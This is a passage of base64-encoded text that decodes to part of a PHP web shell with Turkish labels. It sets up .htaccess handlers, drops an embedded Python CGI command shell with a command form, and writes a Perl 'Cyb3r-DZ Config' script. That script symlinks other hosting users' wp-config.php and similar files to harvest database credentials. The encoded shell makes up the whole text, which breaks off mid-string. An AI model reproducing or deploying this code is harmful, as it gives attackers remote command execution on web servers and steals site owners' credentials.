ID0gZm9wZW4gKCRkb3N5YV9hZGkgLCAndycpIG9yIGRpZSAoIkRvc3lhIGHDp8SxbGFtYWTEsSEiKTsNCiAgICAgICAgJG1ldGluID0gIkFkZEhhbmRsZXIgY2dpLXNjcmlwdCAuaXpvIjsgICAgDQogICAgICAgIGZ3cml0ZSAoICRkb3N5YSAsICRtZXRpbiApIDsNCiAgICAgICAgZmNsb3NlICgkZG9zeWEpOw0KJHB5dGhvbnAgPSAnSXlFdmRYTnlMMkpwYmk5d2VYUm9iMjROQ2lNZ01EY3RNRGN0TURRTkNpTWdkakV1TUM0d0RRb05DaU1nWTJkcExYTm9aV3hzTG5CNURRb2pJRUVnYzJsdGNHeGxJRU5IU1NCMGFHRjBJR1Y0WldOMWRHVnpJR0Z5WW1sMGNtRnllU0J6YUdWc2JDQmpiMjF0WVc1a2N5NE5DZzBLRFFvaklFTnZjSGx5YVdkb2RDQk5hV05vWVdWc0lFWnZiM0prRFFvaklGbHZkU0JoY21VZ1puSmxaU0IwYnlCdGIyUnBabmtzSUhWelpTQmhibVFnY21Wc2FXTmxibk5sSUhSb2FYTWdZMjlrWlM0TkNnMEtJeUJPYnlCM1lYSnlZVzUwZVNCbGVIQnlaWE56SUc5eUlHbHRjR3hwWldRZ1ptOXlJSFJvWlNCaFkyTjFjbUZqZVN3Z1ptbDBibVZ6Y3lCMGJ5QndkWEp3YjNObElHOXlJRzkwYUdWeWQybHpaU0JtYjNJZ2RHaHBjeUJqYjJSbExpNHVMZzBLSXlCVmMyVWdZWFFnZVc5MWNpQnZkMjRnY21semF5QWhJU0VOQ2cwS0l5QkZMVzFoYVd3Z2JXbGphR0ZsYkNCQlZDQm1iMjl5WkNCRVQxUWdiV1VnUkU5VUlIVnJEUW9qSUUxaGFXNTBZV2x1WldRZ1lYUWdkM2QzTG5admFXUnpjR0ZqWlM1dmNtY3VkV3N2WVhSc1lXNTBhV0p2ZEhNdmNIbDBhRzl1ZFhScGJITXVhSFJ0YkEwS0RRb2lJaUlOQ2tFZ2MybHRjR3hsSUVOSFNTQnpZM0pwY0hRZ2RHOGdaWGhsWTNWMFpTQnphR1ZzYkNCamIyMXRZVzVrY3lCMmFXRWdRMGRKTGcwS0lpSWlEUW9qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qRFFvaklFbHRjRzl5ZEhNTkNuUnllVG9OQ2lBZ0lDQnBiWEJ2Y25RZ1kyZHBkR0k3SUdObmFYUmlMbVZ1WVdKc1pTZ3BEUXBsZUdObGNIUTZEUW9nSUNBZ2NHRnpjdzBLYVcxd2IzSjBJSE41Y3l3Z1kyZHBMQ0J2Y3cwS2MzbHpMbk4wWkdWeWNpQTlJSE41Y3k1emRHUnZkWFFOQ21aeWIyMGdkR2x0WlNCcGJYQnZjblFnYzNSeVpuUnBiV1VOQ21sdGNHOXlkQ0IwY21GalpXSmhZMnNOQ21aeWIyMGdVM1J5YVc1blNVOGdhVzF3YjNKMElGTjBjbWx1WjBsUERRcG1jbTl0SUhSeVlXTmxZbUZqYXlCcGJYQnZjblFnY0hKcGJuUmZaWGhqRFFvTkNpTWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TU5DaU1nWTI5dWMzUmhiblJ6RFFvTkNtWnZiblJzYVc1bElEMGdKenhHVDA1VUlFTlBURTlTUFNNME1qUXlORElnYzNSNWJHVTlJbVp2Ym5RdFptRnRhV3g1T25ScGJXVnpPMlp2Ym5RdGMybDZaVG94TW5CME95SStKdzBLZG1WeWMybHZibk4wY21sdVp5QTlJQ2RXWlhKemFXOXVJREV1TUM0d0lEZDBhQ0JLZFd4NUlESXdNRFFuRFFvTkNtbG1JRzl6TG1WdWRtbHliMjR1YUdGelgydGxlU2dpVTBOU1NWQlVYMDVCVFVVaUtUb05DaUFnSUNCelkzSnBjSFJ1WVcxbElEMGdiM011Wlc1MmFYSnZibHNpVTBOU1NWQlVYMDVCVFVVaVhRMEtaV3h6WlRvTkNpQWdJQ0J6WTNKcGNIUnVZVzFsSUQwZ0lpSU5DZzBLVFVWVVNFOUVJRDBnSnlKUVQxTlVJaWNOQ2cwS0l5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl3MEtJeUJRY21sMllYUmxJR1oxYm1OMGFXOXVjeUJoYm1RZ2RtRnlhV0ZpYkdWekRRb05DbVJsWmlCblpYUm1iM0p0S0haaGJIVmxiR2x6ZEN3Z2RHaGxabTl5YlN3Z2JtOTBjSEpsYzJWdWREMG5KeWs2RFFvZ0lDQWdJaUlpVkdocGN5Qm1kVzVqZEdsdmJpd2daMmwyWlc0Z1lTQkRSMGtnWm05eWJTd2daWGgwY21GamRITWdkR2hsSUdSaGRHRWdabkp2YlNCcGRDd2dZbUZ6WldRZ2IyNE5DaUFnSUNCMllXeDFaV3hwYzNRZ2NHRnpjMlZrSUdsdUxpQkJibmtnYm05dUxYQnlaWE5sYm5RZ2RtRnNkV1Z6SUdGeVpTQnpaWFFnZEc4Z0p5Y2dMU0JoYkhSb2IzVm5hQ0IwYUdseklHTmhiaUJpWlNCamFHRnVaMlZrTGcwS0lDQWdJQ2hsTG1jdUlIUnZJSEpsZEhWeWJpQk9iMjVsSUhOdklIbHZkU0JqWVc0Z2RHVnpkQ0JtYjNJZ2JXbHpjMmx1WnlCclpYbDNiM0prY3lBdElIZG9aWEpsSUNjbklHbHpJR0VnZG1Gc2FXUWdZVzV6ZDJWeUlHSjFkQ0IwYnlCb1lYWmxJSFJvWlNCbWFXVnNaQ0J0YVhOemFXNW5JR2x6YmlkMExpa2lJaUlOQ2lBZ0lDQmtZWFJoSUQwZ2UzME5DaUFnSUNCbWIzSWdabWxsYkdRZ2FXNGdkbUZzZFdWc2FYTjBPZzBLSUNBZ0lDQWdJQ0JwWmlCdWIzUWdkR2hsWm05eWJTNW9ZWE5mYTJWNUtHWnBaV3hrS1RvTkNpQWdJQ0FnSUNBZ0lDQWdJR1JoZEdGYlptbGxiR1JkSUQwZ2JtOTBjSEpsYzJWdWRBMEtJQ0FnSUNBZ0lDQmxiSE5sT2cwS0lDQWdJQ0FnSUNBZ0lDQWdhV1lnSUhSNWNHVW9kR2hsWm05eWJWdG1hV1ZzWkYwcElDRTlJSFI1Y0dVb1cxMHBPZzBLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJR1JoZEdGYlptbGxiR1JkSUQwZ2RHaGxabTl5YlZ0bWFXVnNaRjB1ZG1Gc2RXVU5DaUFnSUNBZ0lDQWdJQ0FnSUdWc2MyVTZEUW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdkbUZzZFdWeklEMGdiV0Z3S0d4aGJXSmtZU0I0T2lCNExuWmhiSFZsTENCMGFHVm1iM0p0VzJacFpXeGtYU2tnSUNBZ0lDTWdZV3hzYjNkeklHWnZjaUJzYVhOMElIUjVjR1VnZG1Gc2RXVnpEUW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdaR0YwWVZ0bWFXVnNaRjBnUFNCMllXeDFaWE1OQ2lBZ0lDQnlaWFIxY200Z1pHRjBZUTBLRFFvTkNuUm9aV1p2Y20xb1pXRmtJRDBnSWlJaVBFaFVUVXcrUEVoRlFVUStQRlJKVkV4RlBsQjVkR2h2YmlCRFIwazhMMVJKVkV4RlBqd3ZTRVZCUkQ0TkNqeENUMFJaUGp4RFJVNVVSVkkrRFFvOFNERStVSGwwYUc5dUlFTkhTVHd2U0RFK0RRbzhRajQ4U1Q1Q2VTQmpURzkzVGp3dlFqNDhMMGsrUEVKU1BnMEtJaUlpSzJadmJuUnNhVzVsSUNzaUlpQWlJaUlpSWlJZ0p6d3ZRMFZPVkVWU1BqeENVajRuRFFvTkNuUm9aV1p2Y20wZ1BTQWlJaUk4U0RJK1MyOXRkWFE4TDBneVBnMEtQRVpQVWswZ1RVVlVTRTlFUFZ3aUlpSWlJQ3NnVFVWVVNFOUVJQ3NnSnlJZ1lXTjBhVzl1UFNJbklDc2djMk55YVhCMGJtRnRaU0FySUNJaUlsd2lQZzBLUEdsdWNIVjBJRzVoYldVOVkyMWtJSFI1Y0dVOWRHVjRkRDQ4UWxJK0RRbzhhVzV3ZFhRZ2RIbHdaVDF6ZFdKdGFYUWdkbUZzZFdVOUlrSmhjeUJRWVc1d1lTSStQRUpTUGcwS1BDOUdUMUpOUGp4Q1VqNDhRbEkrSWlJaURRcGliMlI1Wlc1a0lEMGdKend2UWs5RVdUNDhMMGhVVFV3K0p3MEtaWEp5YjNKdFpYTnpJRDBnSnp4RFJVNVVSVkkrUEVneVBsTnZiV1YwYUdsdVp5QlhaVzUwSUZkeWIyNW5QQzlJTWo0OFFsSStQRkJTUlQ0bkRRb05DaU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1OQ2lNZ2JXRnBiaUJpYjJSNUlHOW1JSFJvWlNCelkzSnBjSFFOQ2cwS2FXWWdYMTl1WVcxbFgxOGdQVDBnSjE5ZmJXRnBibDlmSnpvTkNpQWdJQ0J3Y21sdWRDQWlRMjl1ZEdWdWRDMTBlWEJsT2lCMFpYaDBMMmgwYld3aUlDQWdJQ0FnSUNBZ0l5QjBhR2x6SUdseklIUm9aU0JvWldGa1pYSWdkRzhnZEdobElITmxjblpsY2cwS0lDQWdJSEJ5YVc1MElDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBaklITnZJR2x6SUhSb2FYTWdZbXhoYm1zZ2JHbHVaUTBLSUNBZ0lHWnZjbTBnUFNCaloya3VSbWxsYkdSVGRHOXlZV2RsS0NrTkNpQWdJQ0JrWVhSaElEMGdaMlYwWm05eWJTaGJKMk50WkNkZExHWnZjbTBwRFFvZ0lDQWdkR2hsWTIxa0lEMGdaR0YwWVZzblkyMWtKMTBOQ2lBZ0lDQndjbWx1ZENCMGFHVm1iM0p0YUdWaFpBMEtJQ0FnSUhCeWFXNTBJSFJvWldadmNtME5DaUFnSUNCcFppQjBhR1ZqYldRNkRRb2dJQ0FnSUNBZ0lIQnlhVzUwSUNjOFNGSStQRUpTUGp4Q1VqNG5EUW9nSUNBZ0lDQWdJSEJ5YVc1MElDYzhRajVMYjIxMWRDQTZJQ2NzSUhSb1pXTnRaQ3dnSnp4Q1VqNDhRbEkrSncwS0lDQWdJQ0FnSUNCd2NtbHVkQ0FuVTI5dWRXTWdPaUE4UWxJK1BFSlNQaWNOQ2lBZ0lDQWdJQ0FnZEhKNU9nMEtJQ0FnSUNBZ0lDQWdJQ0FnWTJocGJHUmZjM1JrYVc0c0lHTm9hV3hrWDNOMFpHOTFkQ0E5SUc5ekxuQnZjR1Z1TWloMGFHVmpiV1FwRFFvZ0lDQWdJQ0FnSUNBZ0lDQmphR2xzWkY5emRHUnBiaTVqYkc5elpTZ3BEUW9nSUNBZ0lDQWdJQ0FnSUNCeVpYTjFiSFFnUFNCamFHbHNaRjl6ZEdSdmRYUXVjbVZoWkNncERRb2dJQ0FnSUNBZ0lDQWdJQ0JqYUdsc1pGOXpkR1J2ZFhRdVkyeHZjMlVvS1EwS0lDQWdJQ0FnSUNBZ0lDQWdjSEpwYm5RZ2NtVnpkV3gwTG5KbGNHeGhZMlVvSjF4dUp5d2dKenhDVWo0bktRMEtEUW9nSUNBZ0lDQWdJR1Y0WTJWd2RDQkZlR05sY0hScGIyNHNJR1U2SUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDTWdZVzRnWlhKeWIzSWdhVzRnWlhobFkzVjBhVzVuSUhSb1pTQmpiMjF0WVc1a0RRb2dJQ0FnSUNBZ0lDQWdJQ0J3Y21sdWRDQmxjbkp2Y20xbGMzTU5DaUFnSUNBZ0lDQWdJQ0FnSUdZZ1BTQlRkSEpwYm1kSlR5Z3BEUW9nSUNBZ0lDQWdJQ0FnSUNCd2NtbHVkRjlsZUdNb1ptbHNaVDFtS1EwS0lDQWdJQ0FnSUNBZ0lDQWdZU0E5SUdZdVoyVjBkbUZzZFdVb0tTNXpjR3hwZEd4cGJtVnpLQ2tOQ2lBZ0lDQWdJQ0FnSUNBZ0lHWnZjaUJzYVc1bElHbHVJR0U2RFFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnY0hKcGJuUWdiR2x1WlEwS0RRb2dJQ0FnY0hKcGJuUWdZbTlrZVdWdVpBMEtEUW9OQ2lJaUlnMEtWRTlFVHk5SlUxTlZSVk1OQ2cwS0RRb05Da05JUVU1SFJVeFBSdzBLRFFvd055MHdOeTB3TkNBZ0lDQWdJQ0FnVm1WeWMybHZiaUF4TGpBdU1BMEtRU0IyWlhKNUlHSmhjMmxqSUhONWMzUmxiU0JtYjNJZ1pYaGxZM1YwYVc1bklITm9aV3hzSUdOdmJXMWhibVJ6TGcwS1NTQnRZWGtnWlhod1lXNWtJR2wwSUdsdWRHOGdZU0J3Y205d1pYSWdKMlZ1ZG1seWIyNXRaVzUwSnlCM2FYUm9JSE5sYzNOcGIyNGdjR1Z5YzJsemRHVnVZMlV1TGk0TkNpSWlJZz09JzsNCg0KJGZpbGUgPSBmb3BlbigicHl0aG9uLml6byIgLCJ3KyIpOw0KJHdyaXRlID0gZndyaXRlICgkZmlsZSAsYmFzZTY0X2RlY29kZSgkcHl0aG9ucCkpOw0KZmNsb3NlKCRmaWxlKTsNCiAgICBjaG1vZCgicHl0aG9uLml6byIsMDc1NSk7DQogICBlY2hvICI8aWZyYW1lIHNyYz1weXRob24vcHl0aG9uLml6byB3aWR0aD0xMDAlIGhlaWdodD0xMDAlIGZyYW1lYm9yZGVyPTA+PC9pZnJhbWU+ICI7DQp9DQppZiAoaXNzZXQoJF9QT1NUWydTdWJtaXQxMSddKSkNCnsNCiAgICBta2RpcignYWxsY29uZmlnJywgMDc1NSk7DQogICAgY2hkaXIoJ2FsbGNvbmZpZycpOw0KICAgICAgICAka29rZG9zeWEgPSAiLmh0YWNjZXNzIjsNCiAgICAgICAgJGRvc3lhX2FkaSA9ICIka29rZG9zeWEiOw0KICAgICAgICAkZG9zeWEgPSBmb3BlbiAoJGRvc3lhX2FkaSAsICd3Jykgb3IgZGllICgiRG9zeWEgYcOnxLFsYW1hZMSxISIpOw0KICAgICAgICAkbWV0aW4gPSAiQWRkSGFuZGxlciBjZ2ktc2NyaXB0IC5pem8iOyAgICANCiAgICAgICAgZndyaXRlICggJGRvc3lhICwgJG1ldGluICkgOw0KICAgICAgICBmY2xvc2UgKCRkb3N5YSk7DQokY29uZmlnc2hlbGwgPSAnSXlFdmRYTnlMMkpwYmk5d1pYSnNJQzFKTDNWemNpOXNiMk5oYkM5aVlXNWtiV2x1Q25CeWFXNTBJQ0pEYjI1MFpXNTBMWFI1Y0dVNklIUmxlSFF2YUhSdGJGeHVYRzRpT3dwd2NtbHVkQ2M4SVVSUFExUlpVRVVnYUhSdGJDQlFWVUpNU1VNZ0lpMHZMMWN6UXk4dlJGUkVJRmhJVkUxTUlERXVNQ0JVY21GdWMybDBhVzl1WVd3dkwwVk9JaUFpYUhSMGNEb3ZMM2QzZHk1M015NXZjbWN2VkZJdmVHaDBiV3d4TDBSVVJDOTRhSFJ0YkRFdGRISmhibk5wZEdsdmJtRnNMbVIwWkNJK0NqeG9kRzFzSUhodGJHNXpQU0pvZEhSd09pOHZkM2QzTG5jekxtOXlaeTh4T1RrNUwzaG9kRzFzSWo0S1BHaGxZV1ErQ2p4dFpYUmhJR2gwZEhBdFpYRjFhWFk5SWtOdmJuUmxiblF0VEdGdVozVmhaMlVpSUdOdmJuUmxiblE5SW1WdUxYVnpJaUF2UGdvOGJXVjBZU0JvZEhSd0xXVnhkV2wyUFNKRGIyNTBaVzUwTFZSNWNHVWlJR052Ym5SbGJuUTlJblJsZUhRdmFIUnRiRHNnWTJoaGNuTmxkRDExZEdZdE9DSWdMejRLUEhScGRHeGxQbHQrWFNCRGVXSXpjaTFFV2lCRGIyNW1hV2NnTFNCYmZsMGdQQzkwYVhSc1pUNEtQSE4wZVd4bElIUjVjR1U5SW5SbGVIUXZZM056SWo0S0xtNWxkMU4wZVd4bE1TQjdDaUJtYjI1MExXWmhiV2xzZVRvZ1ZHRm9iMjFoT3dvZ1ptOXVkQzF6YVhwbE9pQjRMWE50WVd4c093b2dabTl1ZEMxM1pXbG5hSFE2SUdKdmJHUTdDaUJqYjJ4dmNqb2dJekF3UmtaR1Jqc0tJQ0IwWlhoMExXRnNhV2R1T2lCalpXNTBaWEk3Q24wS1BDOXpkSGxzWlQ0S1BDOW9aV0ZrUGdvbk93cHpkV0lnYkdsc2V3b2dJQ0FnS0NSMWMyVnlLU0E5SUVCZk93b2tiWE55SUQwZ2NYaDdjSGRrZlRzS0pHdHZiR0U5SkcxemNpNGlMeUl1SkhWelpYSTdDaVJyYjJ4aFBYNXpMMXh1THk5bk95QUtjM2x0YkdsdWF5Z25MMmh2YldVdkp5NGtkWE5sY2k0bkwzQjFZbXhwWTE5b2RHMXNMMmx1WTJ4MVpHVnpMMk52Ym1acFozVnlaUzV3YUhBbkxDUnJiMnhoTGljdGMyaHZjQzUwZUhRbktUc0tjM2x0YkdsdWF5Z25MMmh2YldVdkp5NGtkWE5sY2k0bkwzQjFZbXhwWTE5b2RHMXNMMkZ0WlcxaVpYSXZZMjl1Wm1sbkxtbHVZeTV3YUhBbkxDUnJiMnhoTGljdFlXMWxiV0psY2k1MGVIUW5LVHNLYzNsdGJHbHVheWduTDJodmJXVXZKeTRrZFhObGNpNG5MM0IxWW14cFkxOW9kRzFzTDJOdmJtWnBaeTVwYm1NdWNHaHdKeXdrYTI5c1lTNG5MV0Z0WlcxaVpYSXlMblI0ZENjcE93cHplVzFzYVc1cktDY3ZhRzl0WlM4bkxpUjFjMlZ5TGljdmNIVmliR2xqWDJoMGJXd3ZiV1Z0WW1WeWN5OWpiMjVtYVdkMWNtRjBhVzl1TG5Cb2NDY3NKR3R2YkdFdUp5MXRaVzFpWlhKekxuUjRkQ2NwT3dwemVXMXNhVzVyS0NjdmFHOXRaUzhuTGlSMWMyVnlMaWN2Y0hWaWJHbGpYMmgwYld3dlkyOXVabWxuTG5Cb2NDY3NKR3R2YkdFdUp6SXVkSGgwSnlrN0NuTjViV3hwYm1zb0p5OW9iMjFsTHljdUpIVnpaWEl1Snk5d2RXSnNhV05mYUhSdGJDOW1iM0oxYlM5cGJtTnNkV1JsY3k5amIyNW1hV2N1Y0dod0p5d2thMjlzWVM0bkxXWnZjblZ0TG5SNGRDY3BPd3B6ZVcxc2FXNXJLQ2N2YUc5dFpTOG5MaVIxYzJWeUxpY3ZjSFZpYkdsalgyaDBiV3d2WVdSdGFXNHZZMjl1Wmk1d2FIQW5MQ1JyYjJ4aExpYzFMblI0ZENjcE93cHplVzFzYVc1cktDY3ZhRzl0WlM4bkxpUjFjMlZ5TGljdmNIVmliR2xqWDJoMGJXd3ZZV1J0YVc0dlkyOXVabWxuTG5Cb2NDY3NKR3R2YkdFdUp6UXVkSGgwSnlrN0NuTjViV3hwYm1zb0p5OW9iMjFsTHljdUpIVnpaWEl1Snk5d2RXSnNhV05mYUhSdGJDOTNjQzFqYjI1bWFXY3VjR2h3Snl3a2EyOXNZUzRuTFhkd01UTXVkSGgwSnlrN0NuTjViV3hwYm1zb0p5OW9iMjFsTHljdUpIVnpaWEl1Snk5d2RXSnNhV05mYUhSdGJDOWliRzluTDNkd0xXTnZibVpwWnk1d2FIQW5MQ1JyYjJ4aExpY3RkM0F0WW14dlp5NTBlSFFuS1RzS2MzbHRiR2x1YXlnbkwyaHZiV1V2Snk0a2RYTmxjaTRuTDNCMVlteHBZMTlvZEcxc0wyTnZibVpmWjJ4dlltRnNMbkJvY0Njc0pHdHZiR0V1SnpZdWRIaDBKeWs3Q25ONWJXeHBibXNvSnk5b2IyMWxMeWN1SkhWelpYSXVKeTl3ZFdKc2FXTmZhSFJ0YkM5cGJtTnNkV1JsTDJSaUxuQm9jQ2NzSkd0dmJHRXVKemN1ZEhoMEp5azdDbk41Yld4cGJtc29KeTlvYjIxbEx5Y3VKSFZ6WlhJdUp5OXdkV0pzYVdOZmFIUnRiQzlqYjI1dVpXTjBMbkJvY0Njc0pHdHZiR0V1SnpndWRIaDBKeWs3Q25ONWJXeHBibXNvSnk5b2IyMWxMeWN1SkhWelpYSXVKeTl3ZFdKc2FXTmZhSFJ0YkM5dGExOWpiMjVtTG5Cb2NDY3NKR3R2YkdFdUp6a3VkSGgwSnlrN0NuTjViV3hwYm1zb0p5OW9iMjFsTHljdUpIVnpaWEl1Snk5d2RXSnNhV05mYUhSdGJDOXBibU5zZFdSbEwyTnZibVpwWnk1d2FIQW5MQ1JyYjJ4aExpY3hNaTUwZUhRbktUc0tjM2x0YkdsdWF5Z25MMmh2YldVdkp5NGtkWE5sY2k0bkwzQjFZbXhwWTE5b2RHMXNMMnB2YjIxc1lTOWpiMjVtYVdkMWNtRjBhVzl1TG5Cb2NDY3NKR3R2YkdFdUp5MXFiMjl0YkdFdWRIaDBKeWs3Q25ONWJXeHBibXNvSnk5b2IyMWxMeWN1SkhWelpYSXVKeTl3ZFdKc2FXTmZhSFJ0YkM5MllpOXBibU5zZFdSbGN5OWpiMjVtYVdjdWNHaHdKeXdrYTI5c1lTNG5MWFppTG5SNGRDY3BPd3B6ZVcxc2FXNXJLQ2N2YUc5dFpTOG5MaVIxYzJWeUxpY3ZjSFZpYkdsalgyaDBiV3d2YVc1amJIVmtaWE12WTI5dVptbG5MbkJvY0Njc0pHdHZiR0V1SnkxcGJtTnNkV1JsY3kxMllpNTBlSFFuS1RzS2MzbHRiR2x1YXlnbkwyaHZiV1V2Snk0a2RYTmxjaTRuTDNCMVlteHBZMTlvZEcxc0wzZG9iUzlqYjI1bWFXZDFjbUYwYVc5dUxuQm9jQ2NzSkd0dmJHRXVKeTEzYUcweE5TNTBlSFFuS1RzS2MzbHRiR2x1YXlnbkwyaHZiV1V2Snk0a2RYTmxjaTRuTDNCMVlteHBZMTlvZEcxc0wzZG9iV012WTI5dVptbG5kWEpoZEdsdmJpNXdhSEFuTENScmIyeGhMaWN0ZDJodFl6RTJMblI0ZENjcE93cHplVzFzYVc1cktDY3ZhRzl0WlM4bkxpUjFjMlZ5TGljdmNIVmliR2xqWDJoMGJXd3ZkMmh0WTNNdlkyOXVabWxuZFhKaGRHbHZiaTV3YUhBbkxDUnJiMnhoTGljdGQyaHRZM011ZEhoMEp5azdDbk41Yld4cGJtc29KeTlvYjIxbEx5Y3VKSFZ6WlhJdUp5OXdkV0pzYVdOZmFIUnRiQzl6ZFhCd2IzSjBMMk52Ym1acFozVnlZWFJwYjI0dWNHaHdKeXdrYTI5c1lTNG5MWE4xY0hCdmNuUXVkSGgwSnlrN0NuTjViV3hwYm1zb0p5OW9iMjFsTHljdUpIVnpaWEl1Snk5d2RXSnNhV05mYUhSdGJDOWpiMjVtYVdkMWNtRjBhVzl1TG5Cb2NDY3NKR3R2YkdFdUp6RjNhRzFqY3k1MGVIUW5LVHNLYzNsdGJHbHVheWduTDJodmJXVXZKeTRrZFhObGNpNG5MM0IxWW14cFkxOW9kRzFzTDNOMVltMXBkSFJwWTJ0bGRDNXdhSEFuTENScmIyeGhMaWN0ZDJodFkzTXlMblI0ZENjcE93cHplVzFzYVc1cktDY3ZhRzl0WlM4bkxpUjFjMlZ5TGljdmNIVmliR2xqWDJoMGJXd3ZZMnhwWlc1MGN5OWpiMjVtYVdkMWNtRjBhVzl1TG5Cb2NDY3NKR3R2YkdFdUp5MWpiR2xsYm5SekxuUjRkQ2NwT3dwemVXMXNhVzVyS0NjdmFHOXRaUzhuTGlSMWMyVnlMaWN2Y0hWaWJHbGpYMmgwYld3dlkyeHBaVzUwTDJOdmJtWnBaM1Z5WVhScGIyNHVjR2h3Snl3a2EyOXNZUzRuTFdOc2FXVnVkQzUwZUhRbktUc0tjM2x0YkdsdWF5Z25MMmh2YldVdkp5NGtkWE5sY2k0bkwzQjFZbXhwWTE5b2RHMXNMMk5zYVdWdWRHVnpMMk52Ym1acFozVnlZWFJwYjI0dWNHaHdKeXdrYTI5c1lTNG5MV05zYVdWdWRITXVkSGgwSnlrN0NuTjViV3hwYm1zb0p5OW9iMjFsTHljdUpIVnpaWEl1Snk5d2RXSnNhV05mYUhSdGJDOWlhV3hzYVc1bkwyTnZibVpwWjNWeVlYUnBiMjR1Y0dod0p5d2thMjlzWVM0bkxXSnBiR3hwYm1jdWRIaDBKeWs3SUFwemVXMXNhVzVyS0NjdmFHOXRaUzhuTGlSMWMyVnlMaWN2Y0hWaWJHbGpYMmgwYld3dmJXRnVZV2RsTDJOdmJtWnBaM1Z5WVhScGIyNHVjR2h3Snl3a2EyOXNZUzRuTFdKcGJHeHBibWN1ZEhoMEp5azdJQXB6ZVcxc2FXNXJLQ2N2YUc5dFpTOG5MaVIxYzJWeUxpY3ZjSFZpYkdsalgyaDBiV3d2YlhrdlkyOXVabWxuZFhKaGRHbHZiaTV3YUhBbkxDUnJiMnhoTGljdFltbHNiR2x1Wnk1MGVIUW5LVHNnQ25ONWJXeHBibXNvSnk5b2IyMWxMeWN1SkhWelpYSXVKeTl3ZFdKc2FXTmZhSFJ0YkM5dGVYTm9iM0F2WTI5dVptbG5kWEpoZEdsdmJpNXdhSEFuTENScmIyeGhMaWN0WW1sc2JHbHVaeTUwZUhRbktUc2dDbjBLYVdZZ0tDUkZUbFo3SjFKRlVWVkZVMVJmVFVWVVNFOUVKMzBnWlhFZ0oxQlBVMVFuS1NCN0NpQWdjbVZoWkNoVFZFUkpUaXdnSkdKMVptWmxjaXdnSkVWT1Zuc25RMDlPVkVWT1ZGOU1SVTVIVkVnbmZTazdDbjBnWld4elpTQjdDaUFnSkdKMVptWmxjaUE5SUNSRlRsWjdKMUZWUlZKWlgxTlVVa2xPUnlkOU93cDlDa0J3WVdseWN5QTlJSE53YkdsMEtDOG1MeXdnSkdKMVptWmxjaWs3Q21admNtVmhZMmdnSkhCaGFYSWdLRUJ3WVdseWN5a2dld29nSUNna2JtRnRaU3dnSkhaaGJIVmxLU0E5SUhOd2JHbDBLQzg5THl3Z0pIQmhhWElwT3dvZ0lDUnVZVzFsSUQxK0lIUnlMeXN2SUM4N0NpQWdKRzVoYldVZ1BYNGdjeThsS0Z0aExXWkJMVVl3TFRsZFcyRXRaa0V0UmpBdE9WMHBMM0JoWTJzb0lrTWlMQ0JvWlhnb0pERXBLUzlsWnpzS0lDQWtkbUZzZFdVZ1BYNGdkSEl2S3k4Z0x6c0tJQ0FrZG1Gc2RXVWdQWDRnY3k4bEtGdGhMV1pCTFVZd0xUbGRXMkV0WmtFdFJqQXRPVjBwTDNCaFkyc29Ja01pTENCb1pYZ29KREVwS1M5bFp6c0tJQ0FrUms5U1RYc2tibUZ0WlgwZ1BTQWtkbUZzZFdVN0NuMEthV1lnS0NSR1QxSk5lM0JoYzNOOUlHVnhJQ0lpS1hzS2NISnBiblFnSndvOFltOWtlU0JqYkdGemN6MGlibVYzVTNSNWJHVXhJaUJpWjJOdmJHOXlQU0lqTURBd01EQXdJajRLUEhOd1lXNGdjM1I1YkdVOUluUmxlSFF0WkdWamIzSmhkR2x2YmpvZ2JtOXVaU0krUEdadmJuUWdZMjlzYjNJOUlpTXdNRVpHTURBaVBuTjViV3hxYm1zZ1lXeHNJR052Ym1acFp6d3ZabTl1ZEQ0OEwzTndZVzQrUEM5aFBpQUtQR1p2Y20wZ2JXVjBhRzlrUFNKd2IzTjBJajRLUEhSbGVIUmhjbVZoSUc1aGJXVTlJbkJoYzNNaUlITjBlV3hsUFNKaWIzSmtaWEk2TVhCNElHUnZkSFJsWkNBak1EQkdSa1pHT3lCM2FXUjBhRG9nTlRRemNIZzdJR2hsYVdkb2REb2dOREl3Y0hnN0lHSmhZMnRuY205MWJtUXRZMjlzYjNJNkl6QkRNRU13UXpzZ1ptOXVkQzFtWVcxcGJIazZWR0ZvYjIxaE95Qm1iMjUwTFhOcGVtVTZPSEIwT3lCamIyeHZjam9qTURCR1JrWkdJaUFnUGp3dmRHVjRkR0Z5WldFK1BHSnlJQzgrQ2ladVluTndPenh3UGdvOGFXNXdkWFFnYm1GdFpUMGlkR0Z5SWlCMGVYQmxQU0owWlhoMElpQnpkSGxzWlQwaVltOXlaR1Z5T2pGd2VDQmtiM1IwWldRZ0l6QXdSa1pHUmpzZ2QybGtkR2c2SURJeE1uQjRPeUJpWVdOclozSnZkVzVrTFdOdmJHOXlPaU13UXpCRE1FTTdJR1p2Ym5RdFptRnRhV3g1T2xSaGFHOXRZVHNnWm05dWRDMXphWHBsT2pod2REc2dZMjlzYjNJNkl6QXdSa1pHUmpzZ0lpQWdMejQ4WW5JZ0x6NEtKbTVpYzNBN1BDOXdQZ284Y0Q0S1BHbHVjSFYwSUc1aGJXVTlJbE4xWW0xcGRERWlJSFI1Y0dVOUluTjFZbTFwZENJZ2RtRnNkV1U5SWtkbGRDQkRiMjVtYVdjaUlITjBlV3hsUFNKaWIzSmtaWEk2TVhCNElHUnZkSFJsWkNBak1EQkdSa1pHT3lCM2FXUjBhRG9nT1RrN0lHWnZiblF0Wm1GdGFXeDVPbFJoYUc5dFlUc2dabTl1ZEMxemFYcGxPakV3Y0hRN0lHTnZiRzl5T2lN